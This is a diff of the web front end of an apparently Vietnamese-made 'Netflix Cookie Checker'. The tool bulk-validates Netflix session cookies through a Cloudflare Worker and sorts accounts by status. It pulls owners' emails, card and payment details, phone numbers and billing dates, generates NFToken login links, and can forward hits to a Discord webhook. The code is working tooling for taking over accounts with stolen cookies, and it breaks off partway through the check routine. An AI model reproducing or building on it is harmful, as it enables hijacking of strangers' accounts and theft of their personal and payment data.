@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Netflix Cookie Checker (Cloud Edition)</title>
+<title>Netflix Cookie Checker</title>
 <style>
 :root{
   --bg:#0a0a0a;--surface:#111;--card:#181818;--border:#2a2a2a;
@@ -18,29 +18,26 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;display:flex;flex-direction:column;align-items:center}
 
-/* Header */
 header{width:100%;padding:16px 28px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--border);background:var(--surface);position:sticky;top:0;z-index:10}
 .logo{font-size:20px;font-weight:900;letter-spacing:-.5px;color:var(--red);text-transform:uppercase}
 .logo span{color:var(--text);font-weight:300}
 .badge{font-size:9px;background:var(--red);color:#fff;padding:2px 6px;border-radius:3px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
 
-/* Main App Wrapper */
 main{width:100%;max-width:900px;margin:0 auto;padding:32px 16px 80px;display:flex;flex-direction:column;gap:20px}
-
-/* Card & Tabs */
 .card{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:20px}
 .card-title{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:14px}
+
 .tabs{display:flex;gap:2px;background:var(--surface);border-radius:5px;padding:3px;margin-bottom:16px}
 .tab{flex:1;padding:8px;background:none;border:none;border-radius:4px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .15s,color .15s}
 .tab.active{background:var(--card);color:var(--text)}
 .tab-panel{display:none}.tab-panel.active{display:block}
 
-/* Elements */
 .url-row{display:flex;gap:8px;align-items:center}
 .url-row input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:12px;padding:9px 12px;outline:none;transition:border-color .2s}
 .url-row input:focus{border-color:var(--red)}
 .btn-sm{padding:9px 14px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:11px;cursor:pointer;white-space:nowrap;transition:border-color .2s,color .2s}
 .btn-sm:hover{border-color:var(--red);color:var(--text)}
+
 .drop-zone{position:relative;border:2px dashed var(--border);border-radius:6px;padding:24px;text-align:center;cursor:pointer;transition:border-color .2s,background .2s;margin-bottom:12px}
 .drop-zone:hover,.drop-zone.drag-over{border-color:var(--red);background:rgba(229,9,20,.05)}
 .drop-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
@@ -54,21 +51,24 @@ main{width:100%;max-width:900px;margin:0 auto;padding:32px 16px 80px;display:fle
 .or-div{text-align:center;font-size:10px;color:var(--muted);letter-spacing:2px;margin:4px 0 8px;position:relative}
 .or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:44%;height:1px;background:var(--border)}
 .or-div::before{left:0}.or-div::after{right:0}
+
 textarea{width:100%;min-height:130px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:11px;line-height:1.7;padding:12px;resize:vertical;outline:none;transition:border-color .2s}
 textarea:focus{border-color:var(--red)}
+
 .formats{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
 .fmt{font-size:9px;color:var(--muted);border:1px solid var(--border);border-radius:20px;padding:2px 8px;letter-spacing:.5px}
+
 .controls{display:flex;gap:10px;align-items:center;margin-top:14px}
 .btn-check{flex:1;padding:13px;background:var(--red);border:none;border-radius:4px;color:#fff;font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;cursor:pointer;transition:background .2s}
 .btn-check:hover:not(:disabled){background:#c1070f}
 .btn-check:disabled{background:var(--red-dim);cursor:not-allowed;opacity:.7}
 .btn-clear{padding:13px 18px;background:transparent;border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:12px;cursor:pointer;transition:border-color .2s,color .2s}
 .btn-clear:hover{border-color:var(--text);color:var(--text)}
+
 .progress-wrap{display:none;margin-top:14px;background:var(--surface);border-radius:4px;height:3px;overflow:hidden}
 .progress-bar{height:100%;background:var(--red);width:0%;transition:width .3s ease}
 .progress-label{font-size:10px;color:var(--muted);margin-top:5px;display:none}
 
-/* Config Grid */
 .cfg-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 @media(max-width:600px){.cfg-grid{grid-template-columns:1fr}}
 .cfg-group{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:12px}
@@ -77,20 +77,21 @@ textarea:focus{border-color:var(--red)}
 .cfg-row:last-child{margin-bottom:0}
 .cfg-label{font-size:11px;color:var(--text)}
 .cfg-label small{color:var(--muted);font-size:9px;display:block;line-height:1.3}
+
 .toggle{position:relative;width:34px;height:18px;flex-shrink:0}
 .toggle input{opacity:0;width:0;height:0;position:absolute}
 .toggle-track{position:absolute;inset:0;background:#333;border-radius:18px;transition:background .2s;cursor:pointer}
 .toggle input:checked+.toggle-track{background:var(--red)}
 .toggle-track::after{content:'';position:absolute;width:14px;height:14px;background:#fff;border-radius:50%;top:2px;left:2px;transition:left .2s}
 .toggle input:checked+.toggle-track::after{left:18px}
+
 select{background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:4px 8px;outline:none;cursor:pointer}
 select:focus{border-color:var(--red)}
 .webhook-url-row{margin-top:8px}
 .webhook-url-row input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:10px;padding:7px 10px;outline:none}
 .webhook-url-row input:focus{border-color:var(--red)}
 
-/* Stats & Results */
-.stats{display:none;gap:10px;flex-wrap:wrap}
+.stats{display:none;gap:10px;flex-wrap:wrap;margin-top:14px}
 .stat{flex:1;min-width:90px;background:var(--card);border:1px solid var(--border);border-radius:6px;padding:14px;text-align:center}
 .stat-num{font-size:26px;font-weight:900;line-height:1;margin-bottom:3px}
 .stat-label{font-size:9px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
@@ -99,7 +100,8 @@ select:focus{border-color:var(--red)}
 .stat.hold .stat-num{color:var(--hold)}
 .stat.dead .stat-num{color:var(--red)}
 .stat.err  .stat-num{color:var(--muted)}
-#results{display:flex;flex-direction:column;gap:8px}
+
+#results{display:flex;flex-direction:column;gap:8px;margin-top:14px}
 .result-card{background:var(--card);border-radius:6px;border-left:3px solid var(--border);overflow:hidden;animation:fadeIn .2s ease}
 @keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
 .result-card.hit  {border-left-color:var(--green)}
@@ -108,6 +110,7 @@ select:focus{border-color:var(--red)}
 .result-card.dead {border-left-color:var(--red)}
 .result-card.err  {border-left-color:var(--muted)}
 .result-card.checking{border-left-color:#333}
+
 .result-header{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;user-select:none}
 .status-badge{font-size:9px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;padding:3px 8px;border-radius:3px;white-space:nowrap}
 .hit  .status-badge{background:var(--green-dim);color:var(--green)}
@@ -122,15 +125,18 @@ select:focus{border-color:var(--red)}
 .toggle-btn:hover{background:var(--border);color:var(--text)}
 .result-detail{display:none;padding:0 16px 14px;border-top:1px solid var(--border)}
 .result-detail.open{display:block}
+
 .info-grid{display:grid;grid-template-columns:140px 1fr;gap:5px 14px;margin-top:12px;font-size:12px}
 .info-key{color:var(--muted);font-size:10px;letter-spacing:.4px;display:flex;align-items:center}
 .info-val{color:var(--text);font-family:var(--mono);font-size:11px;word-break:break-all}
+
 .nft-section{margin-top:12px;padding:10px 12px;background:var(--blue-dim);border:1px solid var(--blue);border-radius:4px}
 .nft-title{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--blue);margin-bottom:8px}
 .nft-links{display:flex;flex-wrap:wrap;gap:6px}
 .nft-link{display:inline-flex;align-items:center;gap:5px;padding:7px 12px;background:var(--blue);color:#fff;font-size:11px;font-weight:700;border-radius:4px;text-decoration:none;letter-spacing:.3px;transition:opacity .15s}
 .nft-link:hover{opacity:.85}
 .nft-expiry{margin-top:6px;font-size:10px;color:var(--blue);opacity:.7;font-family:var(--mono)}
+
 .action-row{display:flex;gap:7px;margin-top:12px;flex-wrap:wrap}
 .btn-action{font-size:10px;padding:6px 12px;border-radius:3px;cursor:pointer;letter-spacing:.4px;text-transform:uppercase;font-weight:600;transition:border-color .15s,color .15s}
 .btn-copy{background:var(--surface);border:1px solid var(--border);color:var(--muted)}
@@ -138,15 +144,15 @@ select:focus{border-color:var(--red)}
 .btn-copy.copied{border-color:var(--green);color:var(--green)}
 .btn-dl{background:transparent;border:1px solid var(--border);color:var(--muted)}
 .btn-dl:hover{border-color:var(--green);color:var(--green)}
-.export-bar{display:none;gap:8px;flex-wrap:wrap}
+
+.export-bar{display:none;gap:8px;flex-wrap:wrap;margin-top:14px}
 .btn-export{padding:9px 16px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);font-size:11px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;font-weight:600;transition:border-color .2s,color .2s}
 .btn-export:hover{border-color:var(--green);color:var(--green)}
+
 @keyframes spin{to{transform:rotate(360deg)}}
 .spinner{display:inline-block;width:11px;height:11px;border:2px solid #333;border-top-color:var(--red);border-radius:50%;animation:spin .7s linear infinite}
-footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align:center;border-top:1px solid var(--border);width:100%}
-@media(max-width:600px){.info-grid{grid-template-columns:1fr}}
 
-/* LOGIN OVERLAY - Đã xóa display: none để chống lỗi màn hình đen */
+/* Login section */
 #loginSection {
   display: flex; flex-direction: column; align-items: center; justify-content: center;
   position: fixed; inset: 0; background: var(--bg); z-index: 9999; padding: 20px;
@@ -178,34 +184,24 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
 <body>
 
 <noscript>
-  <div style="color: white; text-align: center; padding: 50px;">Bạn cần bật JavaScript trên trình duyệt để sử dụng trang web này!</div>
+  <div style="color: white; text-align: center; padding: 50px;">Vui lòng bật JavaScript!</div>
 </noscript>
 <div id="jsErrorFallback" style="color: var(--red); text-align: center; padding: 20px; display: none; font-weight: bold; position: relative; z-index: 10000;"></div>
 
 <script>
-  // Bắt lỗi Javascript khẩn cấp ngay đầu file và hiển thị ra màn hình
   window.onerror = function(msg, url, line) {
       const errBox = document.getElementById('jsErrorFallback');
       errBox.style.display = 'block';
-      errBox.innerHTML = "Lỗi hệ thống: " + msg + " (Tại dòng " + line + ").<br>Vui lòng kiểm tra lại quá trình copy code hoặc ấn F12 xem Console.";
+      errBox.innerHTML = "Lỗi hệ thống: " + msg + " (Dòng " + line + ")";
   };
 </script>
 
 <div id="loginSection">
   <div class="login-card">
     <h2>Netflix<span>Check</span></h2>
-    <div class="login-group">
-      <label>Step 1: Worker URL</label>
-      <input type="url" id="loginWorkerUrl" placeholder="https://your-worker.workers.dev" spellcheck="false" autocomplete="off" />
-    </div>
-    <div class="login-group">
-      <label>Username</label>
-      <input type="text" id="loginUser" placeholder="Nhập tài khoản whitelist" spellcheck="false" autocomplete="off" />
-    </div>
-    <div class="login-group">
-      <label>Password</label>
-      <input type="password" id="loginPass" placeholder="Nhập mật khẩu" />
-    </div>
+    <div class="login-group"><label>Worker URL</label><input type="url" id="loginWorkerUrl" placeholder="https://..." spellcheck="false" autocomplete="off" /></div>
+    <div class="login-group"><label>Username</label><input type="text" id="loginUser" placeholder="Nhập tài khoản" spellcheck="false" autocomplete="off" /></div>
+    <div class="login-group"><label>Password</label><input type="password" id="loginPass" placeholder="Nhập mật khẩu" /></div>
     <button class="btn-login" onclick="handleLogin()">Đăng nhập</button>
     <div id="loginError"></div>
   </div>
@@ -214,7 +210,7 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
 <div id="appContent" style="display: none; width: 100%; flex-direction: column; align-items: center; min-height: 100vh;">
   <header>
     <div class="logo">Netflix<span>Check</span></div>
-    <div class="badge">Web v4.5 + Cloud</div>
+    <div class="badge">Web v4.6 + Cloud</div>
     <button class="logout-btn" onclick="handleLogout()">Đăng xuất</button>
   </header>
 
@@ -222,7 +218,7 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
   <div class="card">
     <div class="card-title">⚙ Bước 1 — Worker URL</div>
     <div class="url-row">
-      <input id="workerUrl" type="url" placeholder="https://your-worker.your-subdomain.workers.dev" spellcheck="false" autocomplete="off"/>
+      <input id="workerUrl" type="url" placeholder="https://..." spellcheck="false" autocomplete="off"/>
       <button class="btn-sm" onclick="saveUrl()">Lưu</button>
     </div>
   </div>
@@ -239,16 +235,12 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
       <div class="drop-zone" id="dropZone">
         <input type="file" id="fileInput" accept=".txt,.json" multiple/>
         <div class="drop-icon">📂</div>
-        <div class="drop-label"><strong>Kéo thả file vào đây</strong> hoặc click để chọn</div>
+        <div class="drop-label"><strong>Kéo thả file</strong> hoặc click</div>
         <div class="drop-files" id="dropFiles"></div>
       </div>
-      <div class="or-div">hoặc paste thủ công</div>
-      <textarea id="cookieInput" placeholder="Paste cookie — nhiều cookie ngăn cách bằng dòng trống..."></textarea>
-      <div class="formats">
-        <span class="fmt">✓ Netscape .txt</span>
-        <span class="fmt">✓ JSON array</span>
-        <span class="fmt">✓ Multi-file</span>
-      </div>
+      <div class="or-div">hoặc paste</div>
+      <textarea id="cookieInput" placeholder="Paste cookie..."></textarea>
+      <div class="formats"><span class="fmt">✓ Netscape</span><span class="fmt">✓ JSON array</span></div>
     </div>
 
     <div id="tab-cloud" class="tab-panel">
@@ -270,12 +262,20 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
         <div class="cfg-group">
           <div class="cfg-group-title">Features</div>
           <div class="cfg-row">
-            <div class="cfg-label">NFToken Mode<small>pc / mobile / both / off</small></div>
-            <select id="cfg_nftoken"><option value="both">Both</option><option value="false">Off</option></select>
+            <div class="cfg-label">NFToken Mode</div>
+            <select id="cfg_nftoken"><option value="both">Both</option><option value="pc">PC</option><option value="mobile">Mobile</option><option value="false">Off</option></select>
           </div>
           <div class="cfg-row">
-            <div class="cfg-label">Add Emojis<small>Where to show emojis</small></div>
-            <select id="cfg_add_emojis"><option value="webhook">Webhook only</option><option value="txt">TXT only</option><option value="both">Both</option><option value="false">Off</option></select>
+            <div class="cfg-label">NFToken For Free</div>
+            <label class="toggle"><input type="checkbox" id="cfg_nftoken_for_free"/><span class="toggle-track"></span></label>
+          </div>
+          <div class="cfg-row">
+            <div class="cfg-label">NFToken Attempts</div>
+            <select id="cfg_nftoken_attempts"><option>1</option><option>2</option><option selected>3</option><option>4</option><option>5</option></select>
+          </div>
+          <div class="cfg-row" style="margin-top:10px">
+            <div class="cfg-label">Add Emojis</div>
+            <select id="cfg_add_emojis"><option value="webhook">Webhook only</option><option value="txt">TXT only</option><option value="both" selected>Both</option><option value="false">Off</option></select>
           </div>
         </div>
       </div>
@@ -285,32 +285,34 @@ footer{margin-top:auto;padding:16px;font-size:10px;color:var(--muted);text-align
       <div class="cfg-group">
         <div class="cfg-row"><div class="cfg-label">Enabled</div><label class="toggle"><input type="checkbox" id="wh_enabled"/><span class="toggle-track"></span></label></div>
         <div class="webhook-url-row"><input id="wh_url" type="url" placeholder="https://discord.com/api/webhooks/..."/></div>
-        <div class="cfg-row" style="margin-top:8px"><div class="cfg-label">Plans</div><input id="wh_plans" style="background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:10px;padding:4px 8px;width:130px;outline:none" value="all"/></div>
+        <div class="cfg-row" style="margin-top:8px"><div class="cfg-label">Mode</div><select id="wh_mode"><option value="full">Full</option><option value="cookie">Cookie</option><option value="nftoken">NFToken</option></select></div>
+        <div class="cfg-row"><div class="cfg-label">Plans</div><input id="wh_plans" style="background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:10px;padding:4px 8px;width:130px;outline:none" value="all"/></div>
       </div>
     </div>
 
-    <div class="controls">
-      <button class="btn-check" id="checkBtn" onclick="startCheck()">▶ Check Cookie</button>
-      <button class="btn-clear" onclick="clearAll()">Xoá</button>
+    <div id="mainControlsSection">
+      <div class="controls">
+        <button class="btn-check" id="checkBtn" onclick="startCheck()">▶ Check Cookie</button>
+        <button class="btn-clear" onclick="clearAll()">Xoá</button>
+      </div>
+      <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
+      <div class="progress-label" id="progressLabel"></div>
+      
+      <div class="stats" id="statsRow">
+        <div class="stat hit"> <div class="stat-num" id="sHit">0</div> <div class="stat-label">HIT</div></div>
+        <div class="stat free"><div class="stat-num" id="sFree">0</div><div class="stat-label">FREE</div></div>
+        <div class="stat hold"><div class="stat-num" id="sHold">0</div><div class="stat-label">ON HOLD</div></div>
+        <div class="stat dead"><div class="stat-num" id="sDead">0</div><div class="stat-label">EXPIRED</div></div>
+        <div class="stat err"> <div class="stat-num" id="sErr">0</div> <div class="stat-label">ERROR</div></div>
+      </div>
+      <div class="export-bar" id="exportBar">
+        <button class="btn-export" onclick="exportTxt('hit')">⬇ HITs</button>
+        <button class="btn-export" onclick="exportTxt('free')">⬇ FREEs</button>
+        <button class="btn-export" onclick="exportTxt('all')">⬇ ALL</button>
+      </div>
+      <div id="results"></div>
     </div>
-    <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
-    <div class="progress-label" id="progressLabel"></div>
   </div>
-
-  <div class="stats" id="statsRow">
-    <div class="stat hit"> <div class="stat-num" id="sHit">0</div> <div class="stat-label">HIT</div></div>
-    <div class="stat free"><div class="stat-num" id="sFree">0</div><div class="stat-label">FREE</div></div>
-    <div class="stat hold"><div class="stat-num" id="sHold">0</div><div class="stat-label">ON HOLD</div></div>
-    <div class="stat dead"><div class="stat-num" id="sDead">0</div><div class="stat-label">EXPIRED</div></div>
-    <div class="stat err"> <div class="stat-num" id="sErr">0</div> <div class="stat-label">ERROR</div></div>
-  </div>
-
-  <div class="export-bar" id="exportBar">
-    <button class="btn-export" onclick="exportTxt('hit')">⬇ HITs</button>
-    <button class="btn-export" onclick="exportTxt('free')">⬇ FREEs</button>
-    <button class="btn-export" onclick="exportTxt('all')">⬇ ALL Valid</button>
-  </div>
-  <div id="results"></div>
   </main>
 </div>
 
@@ -325,476 +327,297 @@ const loginSec = document.getElementById('loginSection');
 const appCont  = document.getElementById('appContent');
 
 const initialUrl = localStorage.getItem('nf_worker_url');
-if(initialUrl) {
-  document.getElementById('loginWorkerUrl').value = initialUrl;
-  document.getElementById('workerUrl').value = initialUrl;
-}
+if(initialUrl) { document.getElementById('loginWorkerUrl').value = initialUrl; document.getElementById('workerUrl').value = initialUrl; }
 
 async function checkGlobalAuth() {
   const token = localStorage.getItem('nf_app_token');
   const wUrl  = localStorage.getItem('nf_worker_url');
-  
-  if(!token || !wUrl) {
-    showLoginView();
-    return;
-  }
+  if(!token || !wUrl) return showLoginView();
   try {
-    const res = await fetch(`${wUrl}/auth/verify`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token })
-    });
+    const res = await fetch(`${wUrl}/auth/verify`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) });
     const data = await res.json();
-    if(data.ok) showAppView();
-    else handleLogout();
-  } catch(e) {
-    showAppView(); // Fallback khi lỗi mạng
-  }
+    if(data.ok) showAppView(); else handleLogout();
+  } catch(e) { showAppView(); }
 }
-
-function showLoginView() {
-  loginSec.style.display = 'flex';
-  appCont.style.display = 'none';
-}
-
-function showAppView() {
-  loginSec.style.display = 'none';
-  appCont.style.display = 'flex';
-}
-
+function showLoginView() { loginSec.style.display = 'flex'; appCont.style.display = 'none'; }
+function showAppView() { loginSec.style.display = 'none'; appCont.style.display = 'flex'; }
 async function handleLogin() {
-  const rawUrl = document.getElementById('loginWorkerUrl').value.trim();
-  const wUrl = rawUrl.replace(/\/+$/, ''); 
+  const wUrl = document.getElementById('loginWorkerUrl').value.trim().replace(/\/+$/, ''); 
   const user = document.getElementById('loginUser').value.trim();
   const pass = document.getElementById('loginPass').value;
-  const errorDiv = document.getElementById('loginError');
-  
-  if(!wUrl || !user || !pass) {
-    errorDiv.textContent = "Vui lòng nhập đầy đủ các trường dữ liệu!";
-    return;
-  }
-  errorDiv.textContent = "Đang kết nối tới Cloudflare KV...";
-  
+  if(!wUrl || !user || !pass) return document.getElementById('loginError').textContent = "Nhập đủ thông tin!";
+  document.getElementById('loginError').textContent = "Đang kết nối...";
   try {
-    const res = await fetch(`${wUrl}/auth/login`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: user, password: pass })
-    });
+    const res = await fetch(`${wUrl}/auth/login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: user, password: pass }) });
     const data = await res.json();
-    if(data.ok && data.token) {
-      localStorage.setItem('nf_app_token', data.token);
-      localStorage.setItem('nf_worker_url', wUrl);
-      document.getElementById('workerUrl').value = wUrl;
-      showAppView();
-      toast('Đăng nhập thành công ✓');
-    } else {
-      errorDiv.textContent = data.error || "Tài khoản hoặc mật khẩu whitelist sai.";
-    }
-  } catch(e) {
-    errorDiv.textContent = "Lỗi: Không kết nối được tới Worker URL.";
-  }
+    if(data.ok) { localStorage.setItem('nf_app_token', data.token); localStorage.setItem('nf_worker_url', wUrl); document.getElementById('workerUrl').value = wUrl; showAppView(); toast('Đăng nhập thành công ✓'); }
+    else document.getElementById('loginError').textContent = data.error || "Sai thông tin.";
+  } catch(e) { document.getElementById('loginError').textContent = "Lỗi kết nối URL Worker."; }
 }
-
-function handleLogout() {
-  localStorage.removeItem('nf_app_token');
-  showLoginView();
-}
-
+function handleLogout() { localStorage.removeItem('nf_app_token'); showLoginView(); }
 checkGlobalAuth();
 
+// TAB SWITCHER
 function switchTab(name) {
   const panels = ['input', 'cloud', 'config', 'webhook'];
-  document.querySelectorAll('.tab').forEach((t, i) => {
-    t.classList.toggle('active', panels[i] === name);
-  });
-  document.querySelectorAll('.tab-panel').forEach(p => {
-    p.classList.toggle('active', p.id === `tab-${name}`);
-  });
+  document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', panels[i] === name));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.toggle('active', p.id === `tab-${name}`));
+  document.getElementById('mainControlsSection').style.display = name === 'input' ? 'block' : 'none';
   if(name === 'cloud') loadCloudCookies();
 }
 
 const urlInput = document.getElementById('workerUrl');
-function saveUrl(){ const v=urlInput.value.trim().replace(/\/+$/, ''); if(v){ localStorage.setItem('nf_worker_url',v); urlInput.value=v; toast('URL đã lưu ✓'); }}
+function saveUrl(){ const v=urlInput.value.trim().replace(/\/+$/, ''); if(v){ localStorage.setItem('nf_worker_url',v); urlInput.value=v; toast('Lưu URL ✓'); }}
 urlInput.addEventListener('change',()=>{ const v=urlInput.value.trim().replace(/\/+$/, ''); if(v) { localStorage.setItem('nf_worker_url',v); urlInput.value=v; }});
 
 const TXT_FIELD_DEFS = [['name','Name'],['email','Email'],['country','Country'],['plan','Plan'],['member_since','Member Since'],['next_billing','Next Billing'],['payment_method','Payment'],['card','Card'],['phone','Phone'],['quality','Quality'],['max_streams','Streams'],['plan_price','Price'],['hold_status','Hold Status'],['extra_members','Extra Members'],['email_verified','Email Verified'],['membership_status','Membership Status'],['profiles','Profiles'],['user_guid','User GUID']];
 const TXT_DEFAULTS = {name:true,email:true,plan:true,country:true,member_since:true,quality:true,max_streams:true,plan_price:true,next_billing:true,payment_method:true,card:true,phone:true,hold_status:true,extra_members:true,email_verified:true,membership_status:true,profiles:true,user_guid:false};
-
 function buildTxtFieldsGrid(){
-  const g=document.getElementById('txtFieldsGrid');
-  g.innerHTML=TXT_FIELD_DEFS.map(([k,l])=>`<div class="cfg-row"><div class="cfg-label">${l}</div><label class="toggle"><input type="checkbox" id="tf_${k}" ${TXT_DEFAULTS[k]!==false?'checked':''}/><span class="toggle-track"></span></label></div>`).join('');
+  document.getElementById('txtFieldsGrid').innerHTML=TXT_FIELD_DEFS.map(([k,l])=>`<div class="cfg-row"><div class="cfg-label">${l}</div><label class="toggle"><input type="checkbox" id="tf_${k}" ${TXT_DEFAULTS[k]!==false?'checked':''}/><span class="toggle-track"></span></label></div>`).join('');
 }
 buildTxtFieldsGrid();
 
 function getConfig(){
-  const tf={};
-  TXT_FIELD_DEFS.forEach(([k])=>{ tf[k]=document.getElementById(`tf_${k}`)?.checked!==false; });
+  const tf={}; TXT_FIELD_DEFS.forEach(([k])=>{ tf[k]=document.getElementById(`tf_${k}`)?.checked!==false; });
   const plansRaw=(document.getElementById('wh_plans').value||'all').trim();
   const plans = plansRaw.toLowerCase()==='all'?'all':plansRaw.split(',').map(x=>x.trim()).filter(Boolean);
   return {
-    txt_fields: tf,
-    nftoken: document.getElementById('cfg_nftoken').value,
-    add_emojis: document.getElementById('cfg_add_emojis').value,
+    txt_fields: tf, nftoken: document.getElementById('cfg_nftoken').value, add_emojis: document.getElementById('cfg_add_emojis').value,
     notifications: { webhook: { enabled: document.getElementById('wh_enabled').checked, url: document.getElementById('wh_url').value.trim(), mode: document.getElementById('wh_mode') ? document.getElementById('wh_mode').value : 'full', plans } },
-    performance: { nftoken_for_free: false },
-    retries: { nftoken_attempts: 3 },
+    performance: { nftoken_for_free: document.getElementById('cfg_nftoken_for_free') ? document.getElementById('cfg_nftoken_for_free').checked : false },
+    retries: { nftoken_attempts: document.getElementById('cfg_nftoken_attempts') ? parseInt(document.getElementById('cfg_nftoken_attempts').value)||3 : 3 },
   };
 }
 
-const dropZone=document.getElementById('dropZone');
-const fileInput=document.getElementById('fileInput');
+const dropZone=document.getElementById('dropZone'); const fileInput=document.getElementById('fileInput');
 dropZone.addEventListener('dragover',e=>{e.preventDefault();dropZone.classList.add('drag-over');});
 dropZone.addEventListener('dragleave',()=>dropZone.classList.remove('drag-over'));
 dropZone.addEventListener('drop',e=>{ e.preventDefault(); dropZone.classList.remove('drag-over'); handleFiles([...e.dataTransfer.files]); });
 fileInput.addEventListener('change',()=>{ handleFiles([...fileInput.files]); fileInput.value=''; });
-
 async function handleFiles(files){
-  for(const f of files){
-    if(!f.name.match(/\.(txt|json)$/i)) continue;
-    const content=await f.text();
-    if(!loadedFiles.find(x=>x.name===f.name&&x.content===content)) loadedFiles.push({name:f.name,content});
-  }
+  for(const f of files){ if(!f.name.match(/\.(txt|json)$/i)) continue; const content=await f.text(); if(!loadedFiles.find(x=>x.name===f.name&&x.content===content)) loadedFiles.push({name:f.name,content}); }
   renderFileTags();
 }
-function renderFileTags(){
-  const c=document.getElementById('dropFiles');
-  c.innerHTML=loadedFiles.map((f,i)=>`<div class="drop-file-tag">📄 ${esc(f.name)} <button onclick="removeFile(${i})">✕</button></div>`).join('');
-}
+function renderFileTags(){ document.getElementById('dropFiles').innerHTML=loadedFiles.map((f,i)=>`<div class="drop-file-tag">📄 ${esc(f.name)} <button onclick="removeFile(${i})">✕</button></div>`).join(''); }
 function removeFile(i){ loadedFiles.splice(i,1); renderFileTags(); }
 
 function splitCookies(text){
-  text=(text||'').trim();
-  if(!text) return[];
-  if(text.startsWith('[')){
-    try{
-      const a=JSON.parse(text);
-      if(Array.isArray(a)){
-        if(a.length&&typeof a[0]==='object'&&!Array.isArray(a[0])) return[text];
-        return a.map(x=>JSON.stringify(x));
-      }
-    }catch(_){}
-  }
-  const blocks=text.split(/\n\s*\n+/).map(b=>b.trim()).filter(Boolean);
-  const valid=blocks.filter(b=>b.includes('NetflixId')||b.startsWith('[')||b.startsWith('{'));
-  return valid.length?valid:[text];
+  text=(text||'').trim(); if(!text) return[];
+  if(text.startsWith('[')){ try{ const a=JSON.parse(text); if(Array.isArray(a)){ if(a.length&&typeof a[0]==='object'&&!Array.isArray(a[0])) return[text]; return a.map(x=>JSON.stringify(x)); } }catch(_){} }
+  const blocks=text.split(/\n\s*\n+/).map(b=>b.trim()).filter(Boolean); const valid=blocks.filter(b=>b.includes('NetflixId')||b.startsWith('[')||b.startsWith('{')); return valid.length?valid:[text];
 }
 
 async function startCheck(){
   const workerUrl=(urlInput.value||localStorage.getItem('nf_worker_url')||'').trim().replace(/\/+$/, '');
   if(!workerUrl){alert('Vui lòng nhập Worker URL.');return;}
-
   const chunks=[];
-  for(const f of loadedFiles){
-    splitCookies(f.content).forEach(p=>chunks.push({raw:p,label:f.name}));
-  }
+  for(const f of loadedFiles){ splitCookies(f.content).forEach(p=>chunks.push({raw:p,label:f.name})); }
   const manual=document.getElementById('cookieInput').value.trim();
-  if(manual){
-    const parts=splitCookies(manual);
-    parts.forEach((p,i)=>chunks.push({raw:p,label:parts.length>1?`#${i+1}`:'manual'}));
-  }
+  if(manual){ const parts=splitCookies(manual); parts.forEach((p,i)=>chunks.push({raw:p,label:parts.length>1?`#${i+1}`:'manual'})); }
   if(!chunks.length){alert('Chưa có dữ liệu cookie.');return;}
 
-  results=[];counts={hit:0,free:0,hold:0,dead:0,err:0};
-  document.getElementById('results').innerHTML='';
-  updateStats();
-  document.getElementById('statsRow').style.display='flex';
-  document.getElementById('exportBar').style.display='none';
-  document.getElementById('progressWrap').style.display='block';
-  document.getElementById('progressLabel').style.display='block';
+  results=[]; counts={hit:0,free:0,hold:0,dead:0,err:0}; document.getElementById('results').innerHTML=''; updateStats();
+  document.getElementById('statsRow').style.display='flex'; document.getElementById('exportBar').style.display='none';
+  document.getElementById('progressWrap').style.display='block'; document.getElementById('progressLabel').style.display='block';
 
-  const btn=document.getElementById('checkBtn');
-  btn.disabled=true;btn.textContent='Đang check…';running=true;
-
